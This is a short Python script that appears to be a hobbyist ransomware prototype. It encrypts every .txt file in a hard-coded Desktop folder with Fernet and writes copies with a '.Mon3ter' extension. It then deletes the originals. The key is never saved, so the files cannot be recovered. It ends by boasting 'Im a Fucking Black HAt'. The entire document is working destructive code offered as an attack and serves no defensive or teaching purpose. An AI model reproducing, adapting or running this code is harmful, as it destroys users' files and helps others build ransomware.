from subprocess import check_output
import os,sys
from cryptography.fernet import Fernet
from colorama import Fore as color 
import subprocess
from time import sleep
#Generate the key 
key = Fernet.generate_key()

files_list = ''
encrypt = Fernet(key)
os.chdir('/home/zerodey/Desktop/')

ls = subprocess.Popen(['ls', '-p', '.'],stdout=subprocess.PIPE)

with open('files.txt', 'w') as files:
    grep = subprocess.Popen(['grep', '-e', '\.txt$'],stdin=ls.stdout, stdout=files)


with open('files.txt', 'r') as search_list:
    files_list = search_list.read().split('\n')

try:
    
    for file in files_list:
        with open(file,'rb') as filedata:
            data = filedata.read()
            encrypt_data = encrypt.encrypt(data)
            with open(file+'.Mon3ter', 'wb') as new_file:
                new_file = new_file.write(encrypt_data)
                os.remove(file)
        print(color.LIGHTRED_EX+file+"------->"+' [Encrypted]')
    

    print(":) Im a Fucking Black HAt")
    sleep(2)

except:
    print(color.WHITE+"[*] Something Went Wrong.")
    sleep(2)
    os.system('clear')
    sys.exit()
